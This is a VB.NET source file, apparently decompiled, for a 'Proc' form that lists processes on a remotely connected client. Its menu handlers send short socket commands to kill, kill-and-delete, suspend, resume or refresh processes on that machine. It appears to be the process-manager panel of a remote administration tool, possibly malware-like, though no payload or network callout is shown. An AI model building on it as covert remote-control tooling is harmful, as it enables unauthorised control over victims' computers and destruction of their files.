Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class Proc
    Public ID As Integer
    Public osk As Client
    Public sk As Client
    Private Sub KillDeleteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles KillDeleteToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Dim str As String = ""
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = (str & ind.Y & current.SubItems.Item(1).Text)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str.Length > 0) Then
            Me.sk.Send(("kd" & str))
        End If
    End Sub

    Private Sub KillToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles KillToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Dim str As String = ""
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = (str & ind.Y & current.SubItems.Item(1).Text)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str.Length > 0) Then
            Me.sk.Send(("k" & str))
        End If
    End Sub

    Private Sub L1_SelectedIndexChanged(ByVal sender As Object, ByVal e As EventArgs) Handles L1.SelectedIndexChanged
    End Sub

    Private Sub proc_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
        Me.sk.CN = False
    End Sub

    Private Sub proc_GiveFeedback(ByVal sender As Object, ByVal e As GiveFeedbackEventArgs) Handles MyBase.GiveFeedback
    End Sub

    Private Sub proc_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
        Me.sk.Send("~")
        Me.Text = Conversions.ToString(ind.vno(Me.osk.L))
        Me.Timer1.Enabled = True
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Me.sk.Send("~")
    End Sub

    Private Sub ResumeToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ResumeToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Dim str As String = ""
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = (str & ind.Y & current.SubItems.Item(1).Text)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str.Length > 0) Then
            Me.sk.Send(("res" & str))
        End If
    End Sub

    Private Sub SL_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SL.Click
        Me.SL.Text = ""
    End Sub

    Private Sub SuspendToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SuspendToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Dim str As String = ""
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = (str & ind.Y & current.SubItems.Item(1).Text)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str.Length > 0) Then
            Me.sk.Send(("sus" & str))
        End If
    End Sub

    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Timer1.Tick
        If ((Me.osk Is Nothing) Or (Me.sk Is Nothing)) Then
            Me.Close()
        End If
        If (Not Me.osk.CN Or Not Me.sk.CN) Then
            Me.Close()
        End If
    End Sub
End Class